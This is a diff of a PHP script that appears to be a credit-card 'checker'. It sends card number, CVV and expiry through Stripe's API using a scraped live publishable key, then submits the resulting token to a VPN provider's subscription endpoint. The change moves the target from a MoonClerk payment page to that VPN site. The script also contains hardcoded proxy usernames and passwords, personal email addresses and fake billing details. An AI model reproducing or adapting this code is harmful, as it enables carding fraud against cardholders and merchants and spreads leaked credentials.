@@ -168,7 +168,7 @@ $ch = curl_init();
 //curl_setopt($curl, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
 //curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_dc379a83-zone-data_center:3yvhp78xnm7w');
 ///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "pxu19057-0:3ngexg3AFr1CLDHPjVzK");
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods'); ////This may differ from site to site
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 //curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
 ///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "pxu19057-0:3ngexg3AFr1CLDHPjVzK");
@@ -191,7 +191,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=Jack+cooper&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080&guid=1161117f-a174-4a87-a73d-d780b28930aa11a021&muid=b5195db8-c680-4711-92ab-1da891313132033050&sid=76a4ae12-b4e1-400e-9918-799386a0088b701be4&payment_user_agent=stripe.js%2F7df5c2138%3B+stripe-js-v3%2F7df5c2138&time_on_page=140036&key=pk_live_4VRhmzVJRIlREvyaOF05DbB9&_stripe_account=acct_102opF2fOy8ULYr0&pasted_fields=number');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F539dba3af%3B+stripe-js-v3%2F539dba3af&time_on_page=67953&key=pk_live_51JqxTMFjzs9C6LJIBllCeFHO0pUYRCwD92ErnuHKkrbxfizllbEz0thXMBkn0aaueRp3VQNmIEowY0OviLzhrYX400dqfWYQbv');
 $result1 = curl_exec($ch);
 $token = trim(strip_tags(getStr($result1,'"id": "','"')));
 
@@ -201,26 +201,25 @@ echo $token;
 //curl_setopt($ch, CURLOPT_PROXY, $p);
 //curl_setopt($curl, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
 //curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_dc379a83-zone-data_center:3yvhp78xnm7w');
- curl_setopt($ch, CURLOPT_URL, 'https://app.moonclerk.com/pay/7bj96o4wja6i');
+ curl_setopt($ch, CURLOPT_URL, 'https://web-api.vpns.robovpn.com/api/users/subscriptions/subscribe');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-   'Host:app.moonclerk.com',   
+   'Host:web-api.vpns.robovpn.com',   
    'accept: application/json, text/plain, */*',
 //   'X-Checkout-Signature:815f6NXl2U8WrGjEXuv7HXkIDcvvI8I5Tp1UiHArmK0=',
    'content-type: application/json;charset=UTF-8',
    'X-Requested-With: XMLHttpRequest',
 //   'X-CSRF-Token:zfo-UG-FDZpLM4pWdULat6tDQC9N89ugfLPSBAYx0w_H3KpphO6nhQ9C3moGQq6rav9FWM1dwjVunckPVRKFkw',
-   'Origin:https://app.moonclerk.com',
-   'referer: https://app.moonclerk.com/pay/7bj96o4wja6i?embed=true',
+   'Origin:https://www.robovpn.com',
+   'referer: https://www.robovpn.com',
    'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
    'sec-fetch-mode: cors',
 ));
- curl_setopt($ch, CURLOPT_POSTFIELDS, '{"checkout":{"amount_due_cents":1800,"coupon_amount_cents":0,"custom_id":null,"email":"dcmarveltg@gmail.com","embedded":true,"fee_applied_cents":1800,"fee_cents":0,"interval":"month","interval_count":1,"name":"Jack cooper","payment_strategy":"card","recurring":false,"starts_at":null,"subtotal_cents":1800,"terms_of_service_id":null,"total_cents":1800,"write_off_cents":0,"extension_responses_attributes":[],"custom_field_responses_attributes":[{"custom_field_id":652858,"kind":"text_field","title":"First Name","response":"Rahul"},{"custom_field_id":652859,"kind":"text_field","title":"Last Name","response":"Instinct"},{"custom_field_id":652860,"kind":"text_field","title":"Address","response":"West Ln 68"},{"custom_field_id":652861,"kind":"text_field","title":"City","response":"New York"},{"custom_field_id":652862,"kind":"select","title":"State/Province","response":"New York"},{"custom_field_id":652863,"kind":"text_field","title":"Zip/Postal Code","response":"10080"},{"custom_field_id":753377,"kind":"select","title":"Country","response":"United States"},{"custom_field_id":652864,"kind":"text_field","title":"Email","response":"rahulkumarprojects@gmail.com"},{"custom_field_id":652865,"kind":"text_field","title":"Tax Receipt Name","response":"Rahul "},{"custom_field_id":652866,"kind":"text_field","title":"Phone","response":"13218884413"}],"stripe_token":"'.$token.'"},"v":3}');
-
+ curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_token":"'.$token.'","plan":"Monthly","email":"'.$email.'","method":"Stripe","first_name":"Rayan","last_name":"Bryan","postal_code":"10080"}');
 $result = curl_exec($ch);
 
 echo $token;
